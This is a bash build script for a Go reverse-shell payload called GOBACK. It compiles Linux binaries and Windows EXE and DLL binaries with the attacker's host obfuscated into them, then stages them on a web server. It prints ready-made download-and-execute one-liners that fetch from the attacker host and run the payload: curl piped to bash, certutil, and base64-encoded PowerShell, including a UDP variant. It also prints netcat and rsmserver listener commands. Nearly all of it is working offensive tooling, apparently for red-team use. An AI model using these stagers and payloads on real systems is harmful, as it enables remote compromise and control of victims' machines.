#!/bin/bash
cd -- "$(dirname -- "$0")"
echo -e "\e[32m[GOBACK BUILDER]\e[0m $(go version)"

if [ -z "$LHOST" ];then echo "MISSING LHOST !" ;exit;fi
if [ -z "$LPORT" ];then
	LPORT=4444
fi

if [ -z "$PROTO" ];then
	PROTO="TCP"
else
	PROTO="${PROTO^^}"
fi

echo -e "\e[32m[GOBACK BUILDER]\e[0m Protocol \e[32m$PROTO\e[0m"

if [ -z "$KEEPALIVE" ];then
	KEEPALIVE=1
fi

MANUALKEEPALIVE=0
if [ "$PROTO" == "UDP" ];then
	if [ $KEEPALIVE -eq 1 ];then
		MANUALKEEPALIVE=1
	fi
fi

if [ $KEEPALIVE -eq 1 ];then
	if [ $MANUALKEEPALIVE -eq 1 ];then
		echo -e "\e[32m[GOBACK BUILDER]\e[0m Keepalive \e[32mENABLED (message)\e[0m"
	else
		echo -e "\e[32m[GOBACK BUILDER]\e[0m Keepalive \e[32mENABLED (auto)\e[0m"
	fi
else
	echo -e "\e[32m[GOBACK BUILDER]\e[0m Keepalive \e[31mDISABLED\e[0m"
fi

DST=$(echo -n "$LHOST:$LPORT"|xxd -p|tr -d '\n'|xxd -p|tr -d '\n')
ENCODEDPROTO=$(echo -n "${PROTO,,}"|xxd -p|tr -d '\n'|xxd -p|tr -d '\n')

LDFLAGS="-s -X main.maison=$DST -X main.chemin=$ENCODEDPROTO -X main.keepalive=$KEEPALIVE -X main.manualkeepalive=$MANUALKEEPALIVE"
VCS="-buildvcs=false"

# Linux
echo -e "\e[32m[GOBACK BUILDER]\e[0m Builing linux payload \e[0m"
env GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -tags="linux default" -o bin/r -ldflags "$LDFLAGS" $VCS &
wait

# Windows EXE
echo -e "\e[32m[GOBACK BUILDER]\e[0m Builing windows x32 and x64 exe payload \e[0m"
env GOOS=windows GOARCH=amd64 CGO_ENABLED=0 CC=x86_64-w64-mingw32-gcc go build -tags="windows default" -o bin/r.exe -ldflags "$LDFLAGS" $VCS &
env GOOS=windows GOARCH=386 CGO_ENABLED=0 CC=i686-w64-mingw32-gcc go build -tags="windows default" -o bin/r32.exe -ldflags "$LDFLAGS" $VCS &
wait

# Windows DLL
echo -e "\e[32m[GOBACK BUILDER]\e[0m Builing windows x32 and x64 dll payload \e[0m"
env GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -tags="lib windows default" -o bin/r.dll -ldflags "$LDFLAGS" -buildmode=c-shared $VCS &
env GOOS=windows GOARCH=386 CGO_ENABLED=1 CC=i686-w64-mingw32-gcc go build -tags="lib windows default" -o bin/r32.dll -ldflags "$LDFLAGS" -buildmode=c-shared $VCS &
wait

echo -e "\e[32m[GOBACK BUILDER]\e[0m Moving payloads to /var/www/html \e[0m"
cd bin/
chmod 644 r r.exe r32.exe r.dll r32.dll
\cp r r.exe r32.exe r.dll r32.dll /var/www/html/

echo -e "\e[32m[GOBACK BUILDER]\e[0m Preparing linux script \e[0m"
cat << EOF > /var/www/html/r.sh 
cd \$(mktemp -d)
curl $LHOST/r -o r || wget $LHOST/r
chmod 755 r;./r
EOF

echo -e "\e[32m[GOBACK BUILDER]\e[0m Payloads are ready !\e[0m"
cd /var/www/html/
ls -ltrha r r.exe r32.exe r.dll r32.dll r.sh

##################################### UDP

if [ "$PROTO" == "UDP" ];then

echo -e "\n\e[32m[GOBACK BUILDER] x64 WINDOWS POWERSHELL BASE64 DETACH \e[0m"
echo -n "powershell -e "
cat << EOF |tr -d "\n"|iconv -f UTF8 -t UTF16LE |base64 -w 0
\$s,\$p,\$f="$LHOST",$LPORT,"\$env:TEMP\\rudp.exe";
\$c=New-Object Net.Sockets.UdpClient;
\$i=0;
\$w="_RSM_DL_";
\$c.Connect(\$s,\$p);
\$r=New-Object Net.IPEndPoint([Net.IPAddress]::Any,0);
\$S=[System.IO.File]::Open(\$f,[System.IO.FileMode]::Append,[System.IO.FileAccess]::Write);
while(\$true){
\$p=\$w+\$i;\$c.Send([Text.Encoding]::ASCII.GetBytes(\$p),\$p.Length);\$i++;
\$x=\$c.Receive([ref]\$r);
if([Text.Encoding]::ASCII.GetString(\$x)-eq"UDPEOF"){break};\$S.Write(\$x,0,\$x.Length)};\$c.Close();\$S.Close();
Start-Process -NoNewWindow -FilePath "\$f";
EOF

echo -e "\n\n\e[32m[GOBACK BUILDER] LISTEN \e[0m"
cat << EOF
sudo rsmserver -l $LHOST:$LPORT
EOF
echo

exit
fi

##################################### TCP

echo -e "\n\e[32m[GOBACK BUILDER] x64 WINDOWS CMD \e[0m"
cat << EOF
mkdir c:\\r
curl.exe http://$LHOST/r.exe -o c:\\r\\r.exe
c:\\r\\r.exe nerienfaire
c:\\r\\r.exe
EOF

echo -e "\n\e[32m[GOBACK BUILDER] x32 WINDOWS CMD \e[0m"
cat << EOF
CMD.EXE /C "mkdir c:\\r & cd c:\\r & certutil.exe -urlcache -split -f http://$LHOST/r32.exe r32.exe & start /b c:\\r\\r32.exe"
EOF

echo -e "\n\e[32m[GOBACK BUILDER] x32 WINDOWS POWERSHELL DETACH \e[0m"
cat << EOF
\$f="\$env:TEMP\\r32.exe";(New-Object Net.WebClient).DownloadFile("http://$LHOST/r32.exe",\$f);saps -NoNewWindow -FilePath \$f
EOF

echo -e "\n\e[32m[GOBACK BUILDER] x32 WINDOWS POWERSHELL BASE64 WAITING \e[0m"
echo -n "powershell -e "
cat << EOF |tr -d "\n"|iconv -f UTF8 -t UTF16LE |base64 -w 0
\$f="\$env:TEMP\\r32.exe";(New-Object Net.WebClient).DownloadFile("http://$LHOST/r32.exe",\$f);saps -Wait -NoNewWindow -FilePath \$f
EOF

echo -e "\n\n\e[32m[GOBACK BUILDER] x32 WINDOWS POWERSHELL BASE64 DETACH \e[0m"
echo -n "powershell -e "
cat << EOF |tr -d "\n"|iconv -f UTF8 -t UTF16LE |base64 -w 0
\$f="\$env:TEMP\\r32.exe";(New-Object Net.WebClient).DownloadFile("http://$LHOST/r32.exe",\$f);saps -NoNewWindow -FilePath \$f
EOF

echo -e "\n\n\e[32m[GOBACK BUILDER] x64 WINDOWS POWERSHELL BASE64 DETACH \e[0m"
echo -n "powershell -e "
cat << EOF |tr -d "\n"|iconv -f UTF8 -t UTF16LE |base64 -w 0
\$f="\$env:TEMP\\r.exe";curl.exe http://$LHOST/r.exe -o \$f;saps -NoNewWindow -FilePath \$f
EOF

echo -e "\n\n\e[32m[GOBACK BUILDER] x64 LINUX \e[0m"
cat << EOF
curl $LHOST/r.sh|bash
EOF

echo -e "\n\e[32m[GOBACK BUILDER] LISTEN \e[0m"
cat << EOF
sudo rsmserver -l $LHOST:$LPORT
sudo nc -nvlp $LPORT -s $LHOST
EOF
echo

